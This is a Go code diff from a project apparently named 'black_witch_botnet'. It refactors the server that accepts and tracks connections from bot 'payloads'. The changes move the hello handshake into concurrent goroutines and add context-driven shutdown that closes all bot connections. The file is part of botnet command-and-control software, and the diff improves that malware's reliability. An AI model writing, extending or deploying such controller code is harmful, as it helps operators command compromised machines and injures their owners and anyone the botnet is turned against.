@@ -2,8 +2,8 @@ package server
 
 import (
 	"black_witch_botnet/relations"
+	"context"
 	"crypto/tls"
-	"fmt"
 	"log"
 	"net"
 	"os"
@@ -36,11 +36,21 @@ func (ln KeepAliveListener) Accept() (net.Conn, error) {
 	return conn, nil
 }
 
-func (s *AcceptServer) Run(r *Runner, wg sync.WaitGroup) {
+func (s *AcceptServer) Run(r *Runner, wg *sync.WaitGroup, ctx context.Context) {
 	l := s.listen()
-	s.accept(l, r)
+
+	go func () {
+		<-ctx.Done()
+
+		for _, p := range r.Payloads {
+			p.Conn.Close()
+		}
+
+		l.Close()
+	}()
+
+	s.accept(l, r, ctx)
 	wg.Done()
-	defer l.Close()
 }
 
 func (s *AcceptServer) listen() net.Listener {
@@ -76,42 +86,45 @@ func (s *AcceptServer) listen() net.Listener {
 	return l
 }
 
-func (s *AcceptServer) accept(l net.Listener, r *Runner) {
+func (s *AcceptServer) accept(l net.Listener, r *Runner, ctx context.Context) {
 	for {
 		conn, err := l.Accept()
 
 		if err != nil {
-			log.Println("[TCP] Accept connection", err)
-			continue
+			break
 		}
 
-		p := &Payload{
-			Addr: conn.RemoteAddr(),
-			Conn: conn,
-		}
-
-		req := &relations.EventMessage{
-			Type: relations.EventTypeHello,
-		}
-
-		res, err := p.handle(req)
-
-		if err != nil {
-			log.Println("[TCP] Handle hello", err)
-			continue
-		}
-
-		e, ok := res.(*relations.EventResult)
-		if !ok || !e.Status {
-			o := dump(res)
-			log.Printf("[*] Reject connection %s\n", p.Addr)
-			log.Println(o)
-
-			conn.Close()
-			continue
-		}
-
-		r.Payloads = append(r.Payloads, p)
-		log.Printf("[*] New connection %s. Total connections: %d\n", p.Addr, len(r.Payloads))
+		go s.handle(conn, r, ctx)
 	}
+}
+
+func (s *AcceptServer) handle(conn net.Conn, r *Runner, ctx context.Context) {
+	p := &Payload{
+		Addr: conn.RemoteAddr(),
+		Conn: conn,
+	}
+
+	req := &relations.EventMessage{
+		Type: relations.EventTypeHello,
+	}
+
+	res, err := p.handle(req)
+
+	if err != nil {
+		log.Println("[TCP] Handle hello", err)
+		return
+	}
+
+	e, ok := res.(*relations.EventResult)
+	if !ok || !e.Status {
+		o := dump(res)
+		log.Printf("[*] Reject connection %s\n", p.Addr)
+		log.Println(o)
+
+		conn.Close()
+		return
+	}
+
+	r.Payloads = append(r.Payloads, p)
+	log.Printf("[*] New connection %s. Total connections: %d\n", p.Addr, len(r.Payloads))
 }
